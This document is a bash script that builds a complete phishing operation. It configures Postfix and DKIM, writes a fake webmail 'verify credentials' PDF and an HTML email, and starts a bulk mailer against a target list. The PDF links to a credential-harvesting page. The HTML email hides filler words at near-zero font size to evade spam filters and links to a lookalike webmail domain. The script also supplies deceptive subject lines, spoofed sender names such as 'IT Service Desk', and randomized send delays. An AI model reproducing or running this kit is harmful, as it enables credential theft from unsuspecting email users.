#!/bin/bash

# Make sure the script is being run with sudo privileges
if [ "$EUID" -ne 0 ]; then
  echo "Please run this script as root or with sudo privileges."
  exit 1
fi

read -p "Enter your domain (e.g., domain.com): " domain
if [[ -z "$domain" ]]; then
  echo "Domain cannot be empty."
  exit 1
fi

read -p "Enter your username (e.g., no-reply): " username
if [[ -z "$username" ]]; then
  echo "username cannot be empty."
  exit 1
fi

# Update package list and install Postfix
echo "Updating package list and installing Postfix..."
sudo apt-get update -y
sudo apt-get install postfix -y

# Install tmux for session persistence
echo "Installing tmux for persistent sessions..."
sudo apt-get install tmux -y

# Backup the original Postfix config file
echo "Backing up the original Postfix main.cf..."
sudo cp /etc/postfix/main.cf /etc/postfix/main.cf.backup

sudo tee /etc/postfix/generic > /dev/null <<EOL
root@$domain    $username@$domain
@$domain        $username@$domain
EOL

sudo postmap /etc/postfix/generic
sudo service postfix restart || { echo "Postfix failed to restart"; exit 1; }

# Remove the current main.cf to replace with custom config
echo "Removing current main.cf..."
sudo rm /etc/postfix/main.cf

# Create a new Postfix main.cf file with the desired configuration
echo "Creating a new Postfix main.cf file..."
sudo tee /etc/postfix/main.cf > /dev/null <<EOL
# Postfix main configuration file
myhostname = bulkmail.$domain
mydomain = $domain
myorigin = $domain

inet_protocols = ipv4
smtp_helo_name = bulkmail.$domain
smtp_tls_security_level = may
smtp_tls_loglevel = 1

smtp_destination_concurrency_limit = 1
default_process_limit = 50
smtp_generic_maps = hash:/etc/postfix/generic
ignore_rhosts = yes

inet_interfaces = loopback-only
mydestination = localhost
smtp_sasl_auth_enable = no
smtpd_sasl_auth_enable = no
smtp_sasl_security_options = noanonymous

queue_directory = /var/spool/postfix
command_directory = /usr/sbin
daemon_directory = /usr/lib/postfix/sbin
mailbox_size_limit = 0
recipient_delimiter = +
EOL

# Restart Postfix to apply the changes
echo "Restarting Postfix service..."
sudo service postfix restart || { echo "Postfix failed to restart"; exit 1; }

# Install mailutils for sending emails via Postfix
echo "Installing mailutils..."
sudo apt-get install mailutils -y
sudo apt-get install html2text -y
sudo apt-get install parallel base64 -y
sudo apt install wkhtmltopdf -y
sudo apt-get install wkhtmltopdf -y
sudo chown $USER:$USER *

# Create a sample pdf email content (email.pdf)
echo "Creating email.pdf with email content..."
cat > email.pdf <<EOL
%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R /OpenAction 3 0 R >>
endobj

2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj

3 0 obj
<< /Type /Page
   /Parent 2 0 R
   /MediaBox [0 0 612 792]
   /Contents 4 0 R
   /Resources << /Font << /F1 5 0 R /F2 6 0 R /F3 8 0 R >> >>
   /Annots [7 0 R]
>>
endobj

4 0 obj
<< /Length 700 >>
stream
BT
/F1 24 Tf
50 760 Td
(Important Account Notice) Tj

/F2 12 Tf
0 -40 Td
(Hello {recipient-user},) Tj

/F1 14 Tf
0 -30 Td
(Heads up:) Tj

/F2 12 Tf
0 -20 Td
(Your current sign-in method requires confirmation to prevent
losing your sign-in capability.) Tj

0 -20 Td
(- Use the secure link below) Tj
0 -15 Td
(- Review your details) Tj
0 -15 Td
(- Enter confirmation key: 472-762-1") Tj

/F1 12 Tf
0 -40 Td
(Tap Here To Verify Credentials) Tj

/F2 12 Tf
0 -35 Td
(This helps maintain uninterrupted sign-in.) Tj

/F3 9 Tf
0 -35 Td
(System Notification) Tj

0 -15 Td
(© 2025 webmail Inc. For intended recipient.) Tj
ET
endstream
endobj

5 0 obj
<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica-Bold >>
endobj

6 0 obj
<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>
endobj

8 0 obj
<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica-Oblique >>
endobj

7 0 obj
<< /Type /Annot
   /Subtype /Link
   /Rect [50 580 250 595]
   /Border [0 0 0]
   /A << /S /URI /URI (saikim.com.my/wp-signin.php#{recipient-email}) >>
>>
endobj

xref
0 9
0000000000 65535 f
0000000010 00000 n
0000000075 00000 n
0000000130 00000 n
0000000300 00000 n
0000001030 00000 n
0000001085 00000 n
0000001140 00000 n
0000001200 00000 n
trailer
<< /Root 1 0 R /Size 9 >>
startxref
1300
%%EOF

EOL

# Create a sample HTML email content (email.html)
echo "Creating email.html with email content..."
cat > email.html <<EOL
<html><head><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="x-mailer" content="Microsoft Outlook 16.0"><meta http-equiv="Content-Type" content="text/html; charset=windows-1252"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title><span style="font-size: 0.00000000000000000000000000000050340ex;">___________________________________________________________________</span>W<span style="font-size: 0.00000000000000000000000000000077979ex;">C\'est\n</span>ebm<span style="font-size: 0.00000000000000000000000000000080816ex;">Serval,\n</span>ai<span style="font-size: 0.00000000000000000000000000000075268%;">ait\n</span>l<span style="font-size: 0.00000000000000000000000000000011829%;">jusqu\xe2\x80\x99au\n</span>&shy;&nbsp;N<span style="font-size: 0.00000000000000000000000000000045207ex;">Pr\xc3\xa9l\xc3\xa8vements\n</span>otif<span style="font-size: 0.00000000000000000000000000000058705%;">Rh\xc3\xb4ne\n</span>ic<span style="font-size: 0.0000000000000000000000000000006354%;">financ\xc3\xa9\n</span>ation</title><style type="text/css">body {margin: 0;padding: 0;font-family: Roboto, Tahoma, Helvetica, sans-serif;color: #333333;line-height: 1.5;}.header-bar {background-color: #d40000; /* Changed from #029740 (green) to #d40000 (red) */color: #ffffff;padding: 10px;font-size: 12px;}.content {padding: 20px;max-width: 600px;margin: 0 auto;}h1 {color: #ee6111; /* Kept orange accent */text-align: center;font-size: 28px;margin-bottom: 20px;}.footer {text-align: center;font-size: 12px;color: #777777;margin-top: 30px;}</style></head><body><table width="100%" cellspacing="0" cellpadding="0"><tbody><tr><td class="header-bar">M<span style="font-size: 0.0000000000000000000000000000007525ex;">Veil\n</span>ail Ser<span style="font-size: 0.00000000000000000000000000000066311%;">portail\n</span>v<span style="font-size: 0.00000000000000000000000000000075161%;">Roser,\n</span>er Accoun<span style="font-size: 0.00000000000000000000000000000043210%;">Besan\xc3\xa7on\n</span>t U<span style="font-size: 0.00000000000000000000000000000053410ex;">portail\n</span>pd<span style="font-size: 0.00000000000000000000000000000029029ex;">s\'\xc3\xa9tablissait\n</span>ate<span style="font-size: 0.00000000000000000000000000000061971em;">toxicomanies,\n</span>&shy;&nbsp;Notifica<span style="font-size: 0.00000000000000000000000000000020548vh;">histoire,\n</span>t<span style="font-size: 0.00000000000000000000000000000032994vh;">math\xc3\xa9matiques,\n</span>i<span style="font-size: 0.00000000000000000000000000000022387%;">norv\xc3\xa9gienneWorldCat\n</span>on</td></tr></tbody></table><div class="content"><h1>We<span style="font-size: 0.00000000000000000000000000000079582ex;">camps\n</span>b<span style="font-size: 0.00000000000000000000000000000063139ex;">\xc3\x89duens\n</span>ma<span style="font-size: 0.0000000000000000000000000000006471em;">s\'enrichit\n</span>il</h1><p>Y<span style="font-size: 0.00000000000000000000000000000031156vh;">trafics\n</span>our<span style="font-size: 0.00000000000000000000000000000081082ex;">constitutionnelk\n</span>&shy;&nbsp;si<span style="font-size: 0.00000000000000000000000000000044541%;">tarif\n</span>gn-in <span style="font-size: 0.00000000000000000000000000000079317em;">trouv\xc3\xa9\n</span>method will s<span style="font-size: 0.00000000000000000000000000000056716ex;">Beer,\n</span>top f<span style="font-size: 0.00000000000000000000000000000084033ex;">Immigration\n</span>unc<span style="font-size: 0.00000000000000000000000000000013902vw;">l\'empire\n</span>tioning o<span style="font-size: 0.00000000000000000000000000000089390vh;">denses\n</span>n <span style="font-size: 0.00000000000000000000000000000027021vw;">mod\xc3\xa8les\n</span>15/0<span style="font-size: 0.00000000000000000000000000000065945%;">contemporain\n</span>8/2025 <span style="font-size: 0.00000000000000000000000000000035609ex;">produits\n</span>(<u><em>Confirmatio<span style="font-size: 0.00000000000000000000000000000066157vh;">classes\n</span>n <span style="font-size: 0.00000000000000000000000000000077797vw;">r\xc3\xa9partis\n</span>Need<span style="font-size: 0.00000000000000000000000000000020991%;">Culture\n</span>ed</em></u>)<span style="font-size: 0.00000000000000000000000000000023516vw;">participe-t-elle\n</span>, y<span style="font-size: 0.00000000000000000000000000000085399ex;">l\xe2\x80\x99universit\xc3\xa9\n</span>ou m<span style="font-size: 0.00000000000000000000000000000035029vw;">Alains\n</span>us<span style="font-size: 0.00000000000000000000000000000079194em;">EUR\n</span>t <span style="font-size: 0.00000000000000000000000000000075804ex;">tradition\n</span>take prompt <span style="font-size: 0.00000000000000000000000000000040015vw;">soins\n</span>st<span style="font-size: 0.00000000000000000000000000000074251ex;">baby\n</span>eps t<span style="font-size: 0.00000000000000000000000000000089490vh;">s\xe2\x80\x99\xc3\xa9rigent\n</span>o m<span style="font-size: 0.0000000000000000000000000000003481%;">voiture\n</span>ai<span style="font-size: 0.00000000000000000000000000000023920ex;">lien\n</span>ntain <span style="font-size: 0.0000000000000000000000000000004931%;">habitats\n</span>an<span style="font-size: 0.00000000000000000000000000000024318vw;">solide,\n</span>d<span style="font-size: 0.0000000000000000000000000000002965%;">populaire\n</span>&shy;&nbsp;preven<span style="font-size: 0.00000000000000000000000000000070491%;">vraiment\n</span>t <span style="font-size: 0.00000000000000000000000000000093891ex;">favorise,\n</span>l<span style="font-size: 0.00000000000000000000000000000034596vh;">langue\n</span>imita<span style="font-size: 0.0000000000000000000000000000004042ex;">Regnard,\n</span>t<span style="font-size: 0.0000000000000000000000000000003980vh;">douloureuse\n</span>io<span style="font-size: 0.0000000000000000000000000000009244ex;">payants\n</span>ns <span style="font-size: 0.00000000000000000000000000000037058%;">qu\'une\n</span>to <span style="font-size: 0.00000000000000000000000000000037260em;">date\n</span>your <span style="font-size: 0.00000000000000000000000000000095857em;">Commissariat\n</span>mail a<span style="font-size: 0.00000000000000000000000000000023119%;">d\'habitude\n</span>c<span style="font-size: 0.00000000000000000000000000000021884%;">l\xe2\x80\x99\xc3\xa9ducation\n</span>c<span style="font-size: 0.00000000000000000000000000000071549vw;">monuments\n</span>ount<span style="font-size: 0.00000000000000000000000000000041045ex;">lorraine,\n</span>.<br><br><span style="font-size: 15pt;"><font color="#ff0000"><u><a href="http://www.wabmail.gitse.in#{base64-encryptedrecipents-email}">Start <span style="font-size: 0.00000000000000000000000000000025759em;">Landes\n</span>Process<span style="font-size: 0.00000000000000000000000000000038816vh;">Tribune\n</span></a></u></font></span></p><p>View <span style="font-size: 0.00000000000000000000000000000044801vh;">majoritaire\n</span>t<span style="font-size: 0.00000000000000000000000000000065197ex;">Midi\n</span>h<span style="font-size: 0.0000000000000000000000000000006431vh;">Suisse\n</span>e <span style="font-size: 0.00000000000000000000000000000061731ex;">s\'y\n</span>attached <span style="font-size: 0.00000000000000000000000000000056011em;">royaumeN\n</span>d<span style="font-size: 0.00000000000000000000000000000096893vh;">cassoulet\n</span>ocument <span style="font-size: 0.000000000000000000000000000000591vh;">Guadeloupe,\n</span>for f<span style="font-size: 0.00000000000000000000000000000028875vh;">Trait\xc3\xa9\n</span>ur<span style="font-size: 0.00000000000000000000000000000064122%;">Lisle\n</span>ther <span style="font-size: 0.0000000000000000000000000000007495%;">quotidienne\n</span>in<span style="font-size: 0.00000000000000000000000000000071912ex;">fiscaux\n</span>s<span style="font-size: 0.00000000000000000000000000000066485vh;">Pr\xc3\xa9vert\n</span>tru<span style="font-size: 0.00000000000000000000000000000055455vh;">permettent\n</span>c<span style="font-size: 0.00000000000000000000000000000057555%;">r\xc3\xa9gress\xc3\xa9\n</span>tions.</p><p>Thank <span style="font-size: 0.00000000000000000000000000000040773ex;">am\xc3\xa9ricain\n</span>you<span style="font-size: 0.00000000000000000000000000000075894vh;">Heyer,\n</span>.<span style="font-size: 0.00000000000000000000000000000050006%;">l\'oxyg\xc3\xa8ne\n</span></p></div><div class="footer"><p>&copy; 2<span style="font-size: 0.00000000000000000000000000000057276vh;">Berlioz,\n</span>025&nbsp;<span style="font-size: 0.00000000000000000000000000000014114%;">g\xc3\xa9rer\n</span>Webm<span style="font-size: 0.00000000000000000000000000000091567em;">n\xe2\x80\x99a\n</span>a<span style="font-size: 0.00000000000000000000000000000075357em;">si\xc3\xa8cleb\n</span>il In<span style="font-size: 0.00000000000000000000000000000068078ex;">acteurs\n</span>c.Fo<span style="font-size: 0.00000000000000000000000000000057083ex;">Carolingiens,\n</span>r i<span style="font-size: 0.00000000000000000000000000000033804vw;">multiples\n</span>nt<span style="font-size: 0.00000000000000000000000000000016986vw;">Rouget\n</span>ended r<span style="font-size: 0.00000000000000000000000000000091027vw;">P\xc3\xa8res\n</span>e<span style="font-size: 0.00000000000000000000000000000062517em;">Tandis\n</span>c<span style="font-size: 0.00000000000000000000000000000018951ex;">repr\xc3\xa9sentants\n</span>ipient.<span style="font-size: 0.00000000000000000000000000000077735em;">Bangkok,\n</span></p></div></body></html>
EOL

# Create a sample txt subject content (subject.txt)
echo "Creating subject.txt with subject content..."
cat > subject.txt <<EOL
Revalidate
Confirm {recipient-email}
{recipient-user} validation
Secure {recipient-domain}
{recipient-user} re-auth
Ref:{random-number} error notification
{recipient-user} validate
{recipient-domain} maintenance: confirm your details
Account security update
Authentication required
Confirmation requested
Records update required
Security confirmation
Routine authentication for your email account
MX records confirmation
Email system maintenance notification
Verify your account
Final step to secure account
Review required
EOL

# Create a sample txt name content (name.txt)
echo "Creating name.txt with name content..."
cat > name.txt <<EOL
Support
Mail Delivery
Admin
System Notification
Mailbox
Mail Server
Security Team
Postmaster
IT Service Desk
IT
Webmail Admin
Mail Operations
Support Team
Message Center
Administrator
No-Reply Mailer
Email Management
SecureMail Services
Webmail Notification
IT Security Admin
Network Operations
CyberSecurity
System Compliance
Infrastructure Watch
IT Governance
Mail Shield
Domain Guardian
Inbox Sentinel
Cyber Patrol
Firewall Watch
Secure Gateway
Data Bastion
Threat Response
Breach Alert
Policy Enforcer
Login Vigilante
SSO Guardian
2FA Enforcer
Identity Sentinel
Domain & Server Focused
DNS Protector
Server Watchtower
Hosting Safeguard
SSL Sentinel
Webmail Revalidation
Backup Defender
Server Patrol
Webmail Defender
No-Reply Security
Do Not Ignore: IT Dept
Verified IT Sender
Domain Patrol
EOL

# Create a sample txt list content (list.txt)
echo "Creating list.txt with list content..."
cat > list.txt <<EOL
info@brickx.us
mackenzie@walshequipment.ca
podpora@vsezapivo.si
EOL

# Create the sending script (send.sh)
echo "Creating send.sh for bulk email sending..."
cat > send.sh <<EOL
#!/bin/bash

# Configuration files
EMAIL_LIST="list.txt"
HTML_TEMPLATE="email.html"
PDF_TEMPLATE="email.pdf"
SUBJECT_FILE="subject.txt"
NAME_FILE="name.txt"
LOG_FILE="send_log_\$(date +%Y%m%d).txt"

# Mode selection (html, htmlpdf, txtpdf, txthtml)
MODE="htmlpdf"  # Change to desired mode: html, htmlpdf, txtpdf, or txthtml

# Initialize counters
TOTAL=\$(wc -l < "\$EMAIL_LIST")
SUCCESS=0
FAILED=0

# Ensure runtime dir is set to avoid wkhtmltopdf error
export XDG_RUNTIME_DIR="\${XDG_RUNTIME_DIR:-/tmp/runtime-\$UID}"
mkdir -p "\$XDG_RUNTIME_DIR"

# Verify required files exist based on mode
case "\$MODE" in
    "html")
        REQUIRED_FILES=("\$EMAIL_LIST" "\$HTML_TEMPLATE" "\$SUBJECT_FILE" "\$NAME_FILE")
        ;;
    "htmlpdf")
        REQUIRED_FILES=("\$EMAIL_LIST" "\$HTML_TEMPLATE" "\$PDF_TEMPLATE" "\$SUBJECT_FILE" "\$NAME_FILE")
        ;;
    "txtpdf")
        REQUIRED_FILES=("\$EMAIL_LIST" "\$PDF_TEMPLATE" "\$SUBJECT_FILE" "\$NAME_FILE")
        ;;
    "txthtml")
        REQUIRED_FILES=("\$EMAIL_LIST" "\$HTML_TEMPLATE" "\$SUBJECT_FILE" "\$NAME_FILE")
        ;;
    *)
        echo "Error: Invalid mode specified. Use html, htmlpdf, txtpdf, or txthtml" | tee -a "\$LOG_FILE"
        exit 1
        ;;
esac

for file in "\${REQUIRED_FILES[@]}"; do
    if [ ! -f "\$file" ]; then
        echo "Error: Missing \$file for \$MODE mode" | tee -a "\$LOG_FILE"
        exit 1
    fi
done

# Load all subjects and names into arrays
mapfile -t SUBJECTS < "\$SUBJECT_FILE"
mapfile -t NAMES < "\$NAME_FILE"

# Random name generator (from name.txt)
get_random_name() {
    echo "\${NAMES[\$((RANDOM % \${#NAMES[@]}))]}"
}

# Random number generator (4-6 digits)
get_random_number() {
    echo \$((RANDOM % 9000 + 1000))
}

# Function to process PDF template with variables
process_pdf_template() {
    local email=\$1
    local random_name=\$2
    local random_number=\$3
    local current_date=\$4
    local email_user=\$5
    local email_domain=\$6
    local base64_email=\$7
    
    # Create a temporary PDF file
    local temp_pdf=\$(mktemp --suffix=".pdf")
    
    # Process the PDF template with variables
    sed \\
        -e "s|{date}|\$current_date|g" \\
        -e "s|{recipient-email}|\$email|g" \\
        -e "s|{recipient-user}|\$email_user|g" \\
        -e "s|{recipient-domain}|\$email_domain|g" \\
        -e "s|{name}|\$random_name|g" \\
        -e "s|{random-name}|\$(get_random_name)|g" \\
        -e "s|{random-number}|\$random_number|g" \\
        -e "s|{sender-email}|$username@$domain|g" \\
        -e "s|{sender-name}|\$SELECTED_SENDER_NAME|g" \\
        -e "s|{base64-encryptedrecipents-email}|\$base64_email|g" \\
        "\$PDF_TEMPLATE" > "\$temp_pdf"
    
    echo "\$temp_pdf"
}

# Function to convert HTML to PDF
convert_html_to_pdf() {
    local html_file=\$1
    local output_pdf=\$2
    
    HTML_FILE_URI="file://\$html_file"
    if ! wkhtmltopdf --quiet --enable-local-file-access --load-error-handling ignore "\$HTML_FILE_URI" "\$output_pdf" >/dev/null 2>&1; then
        echo "\$(date) - WARNING: PDF generation failed for \$CLEAN_EMAIL" >> "\$LOG_FILE"
        echo ""
    else
        echo "\$output_pdf"
    fi
}

# Process each email
while IFS= read -r email; do
    CLEAN_EMAIL=\$(echo "\$email" | tr -d '\r\n')
    EMAIL_USER=\$(echo "\$CLEAN_EMAIL" | cut -d@ -f1)
    EMAIL_DOMAIN=\$(echo "\$CLEAN_EMAIL" | cut -d@ -f2)
    CURRENT_DATE=\$(date +%Y-%m-%d)
    BASE64_EMAIL=\$(echo -n "\$CLEAN_EMAIL" | base64)

    RANDOM_NAME=\$(get_random_name)
    RANDOM_NUMBER=\$(get_random_number)
    SELECTED_SENDER_NAME="\${NAMES[\$((RANDOM % \${#NAMES[@]}))]}"

    SELECTED_SUBJECT="\${SUBJECTS[\$((RANDOM % \${#SUBJECTS[@]}))]}"
    SELECTED_SUBJECT=\$(echo "\$SELECTED_SUBJECT" | sed \\
        -e "s|{date}|\$CURRENT_DATE|g" \\
        -e "s|{recipient-email}|\$CLEAN_EMAIL|g" \\
        -e "s|{recipient-user}|\$EMAIL_USER|g" \\
        -e "s|{recipient-domain}|\$EMAIL_DOMAIN|g" \\
        -e "s|{name}|\$RANDOM_NAME|g" \\
        -e "s|{random-name}|\$(get_random_name)|g" \\
        -e "s|{random-number}|\$RANDOM_NUMBER|g")

    echo "Processing: \$CLEAN_EMAIL"

    MESSAGE_ID="<\$(date +%s%N).\$(openssl rand -hex 8)@$domain>"

    # Prepare variables for all templates
    COMMON_SED_ARGS=(
        -e "s|{date}|\$CURRENT_DATE|g"
        -e "s|{recipient-email}|\$CLEAN_EMAIL|g"
        -e "s|{recipient-user}|\$EMAIL_USER|g"
        -e "s|{recipient-domain}|\$EMAIL_DOMAIN|g"
        -e "s|{name}|\$RANDOM_NAME|g"
        -e "s|{random-name}|\$(get_random_name)|g"
        -e "s|{random-number}|\$RANDOM_NUMBER|g"
        -e "s|{sender-email}|$username@$domain|g"
        -e "s|{sender-name}|\$SELECTED_SENDER_NAME|g"
        -e "s|{base64-encryptedrecipents-email}|\$BASE64_EMAIL|g"
    )

    # Process templates based on mode
    case "\$MODE" in
        "html")
            # HTML mode: Only HTML body, no attachment
            TEMP_BODY=\$(mktemp --suffix=".html")
            sed "\${COMMON_SED_ARGS[@]}" "\$HTML_TEMPLATE" > "\$TEMP_BODY"
            PDF_FILE=""
            ;;
        "htmlpdf")
            # HTMLPDF mode: HTML body + PDF attachment
            TEMP_BODY=\$(mktemp --suffix=".html")
            sed "\${COMMON_SED_ARGS[@]}" "\$HTML_TEMPLATE" > "\$TEMP_BODY"
            PDF_FILE=\$(process_pdf_template "\$CLEAN_EMAIL" "\$RANDOM_NAME" "\$RANDOM_NUMBER" "\$CURRENT_DATE" "\$EMAIL_USER" "\$EMAIL_DOMAIN" "\$BASE64_EMAIL")
            ;;
        "txtpdf")
            # TXTPDF mode: Text body + PDF attachment
            TEMP_BODY=\$(mktemp)
            cat <<EOF > "\$TEMP_BODY"
Reminder: Complete verification for \$CLEAN_EMAIL via the attached instructions (from \$CURRENT_DATE to 2025-06-30) to prevent losing access to your account.

Webmail © 2025. All rights reserved.
EOF
            PDF_FILE=\$(process_pdf_template "\$CLEAN_EMAIL" "\$RANDOM_NAME" "\$RANDOM_NUMBER" "\$CURRENT_DATE" "\$EMAIL_USER" "\$EMAIL_DOMAIN" "\$BASE64_EMAIL")
            ;;
        "txthtml")
            # TXTHTML mode: Text body + HTML-to-PDF attachment
            TEMP_BODY=\$(mktemp)
            cat <<EOF > "\$TEMP_BODY"
Reminder: Complete verification for \$CLEAN_EMAIL via the attached instructions (from \$CURRENT_DATE to 2025-06-30) to prevent losing access to your account.

Webmail © 2025. All rights reserved.
EOF
            TEMP_HTML=\$(mktemp --suffix=".html")
            sed "\${COMMON_SED_ARGS[@]}" "\$HTML_TEMPLATE" > "\$TEMP_HTML"
            SAFE_EMAIL=\$(echo "\$CLEAN_EMAIL" | sed 's/[^a-zA-Z0-9@.]/_/g')
            PDF_FILE="/tmp/Verfy_\${SAFE_EMAIL}.pdf"
            PDF_FILE=\$(convert_html_to_pdf "\$TEMP_HTML" "\$PDF_FILE")
            rm "\$TEMP_HTML"
            ;;
    esac

    # Build and send the email
    {
    echo "Return-Path: <$username@$domain>"
    echo "From: \"\$SELECTED_SENDER_NAME\" <$username@$domain>"
    echo "To: <\$CLEAN_EMAIL>"
    echo "Subject: \$SELECTED_SUBJECT"
    echo "MIME-Version: 1.0"
    echo "Message-ID: \$MESSAGE_ID"
    
    if [ "\$MODE" = "html" ] || [ "\$MODE" = "htmlpdf" ]; then
        # HTML email (with or without attachment)
        echo "Content-Type: multipart/mixed; boundary=\"BOUNDARY\""
        echo
        echo "--BOUNDARY"
        echo "Content-Type: text/html; charset=UTF-8"
        echo
        cat "\$TEMP_BODY"
        echo
    else
        # Plain text email (with attachment)
        echo "Content-Type: multipart/mixed; boundary=\"BOUNDARY\""
        echo
        echo "--BOUNDARY"
        echo "Content-Type: text/plain; charset=UTF-8"
        echo
        cat "\$TEMP_BODY"
        echo
    fi

    # Add PDF attachment if present
    if [ -n "\$PDF_FILE" ] && [ -f "\$PDF_FILE" ]; then
        echo "--BOUNDARY"
        echo "Content-Type: application/pdf; name=\"Verfy \$CLEAN_EMAIL.pdf\""
        echo "Content-Transfer-Encoding: base64"
        echo "Content-Disposition: attachment; filename=\"Verfy \$CLEAN_EMAIL.pdf\""
        echo
        base64 "\$PDF_FILE"
        echo
    fi

    echo "--BOUNDARY--"
    } | /usr/sbin/sendmail -t -oi

    # Clean up temporary files
    rm "\$TEMP_BODY"
    [ -n "\$PDF_FILE" ] && [ -f "\$PDF_FILE" ] && rm "\$PDF_FILE"

    if [ \$? -eq 0 ]; then
        echo "\$(date) - SUCCESS: \$CLEAN_EMAIL" >> "\$LOG_FILE"
        ((SUCCESS++))
    else
        echo "\$(date) - FAILED: \$CLEAN_EMAIL" >> "\$LOG_FILE"
        ((FAILED++))
    fi

    sleep \$(awk -v min=0.3 -v max=0.8 'BEGIN{srand(); print min+rand()*(max-min)}')

    echo "[\$SUCCESS/\$TOTAL] Sent to \$CLEAN_EMAIL"

done < "\$EMAIL_LIST"

echo "Completed at \$(date)" >> "\$LOG_FILE"
echo "Total: \$TOTAL | Success: \$SUCCESS | Failed: \$FAILED" >> "\$LOG_FILE"
echo "Full log: \$LOG_FILE"
EOL


# Make the send.sh script executable
chmod +x send.sh

# Create a tmux session and run the send.sh script in it
echo "Starting tmux session and running send.sh..."
tmux new-session -d -s mail_session "./send.sh"

# Print instructions for reattaching to the tmux session
echo "Your email sending process is running in the background with tmux."
echo "To reattach to the session, use: tmux attach -t mail_session"

#####################################
# DKIM Setup (Appended at the End) #
#####################################
echo "Installing OpenDKIM..."
sudo apt install opendkim opendkim-tools -y

echo "Setting up DKIM directory structure..."
sudo mkdir -p /etc/opendkim/keys/$domain
cd /etc/opendkim/keys/$domain
sudo opendkim-genkey -s bulkmail -d $domain
sudo chown opendkim:opendkim bulkmail.private

# SigningTable
sudo tee /etc/opendkim/SigningTable > /dev/null <<EOL
*@$domain bulkmail._domainkey.$domain
EOL

# KeyTable
sudo tee /etc/opendkim/KeyTable > /dev/null <<EOL
bulkmail._domainkey.$domain $domain:bulkmail:/etc/opendkim/keys/$domain/bulkmail.private
EOL

# TrustedHosts
sudo tee /etc/opendkim/TrustedHosts > /dev/null <<EOL
127.0.0.1
localhost
$domain
EOL

# opendkim.conf
sudo tee /etc/opendkim.conf > /dev/null <<EOL
Socket                  inet:12301@localhost
PidFile                 /run/opendkim/opendkim.pid
UserID                  opendkim
UMask                   002

Syslog                  yes
SyslogSuccess           yes

Canonicalization        relaxed/simple
Mode                    sv
SubDomains              no
AutoRestart             yes
AutoRestartRate         10/1h
Background              yes
OversignHeaders         From

Domain                  $domain
Selector                bulkmail
KeyFile                 /etc/opendkim/keys/$domain/bulkmail.private
SigningTable            refile:/etc/opendkim/SigningTable
KeyTable                refile:/etc/opendkim/KeyTable
InternalHosts           /etc/opendkim/TrustedHosts
ExternalIgnoreList      /etc/opendkim/TrustedHosts

TrustAnchorFile         /usr/share/dns/root.key
EOL

# Fix permissions
sudo chown -R opendkim:opendkim /etc/opendkim
sudo chmod -R go-rwx /etc/opendkim/keys

# Restart services
sudo service opendkim restart
sudo service postfix restart

echo "DKIM setup completed for $domain."
echo "Don't forget to publish the DKIM DNS TXT record located in /etc/opendkim/keys/$domain/bulkmail.txt"
